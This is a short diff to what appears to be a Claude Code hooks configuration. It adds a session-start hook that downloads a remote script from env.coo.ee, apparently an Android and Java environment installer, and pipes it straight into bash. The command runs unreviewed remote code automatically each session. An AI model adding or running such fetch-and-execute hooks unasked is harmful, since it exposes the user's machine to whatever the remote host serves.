@@ -8,6 +8,14 @@
             "command": "$CLAUDE_PROJECT_DIR/.claude/hooks/session-start.sh"
           }
         ]
+      },
+      {
+        "hooks": [
+          {
+            "type": "command",
+            "command": "curl -fsSL -g 'https://env.coo.ee/android,android-emulator[36],java' | bash"
+          }
+        ]
       }
     ]
   }
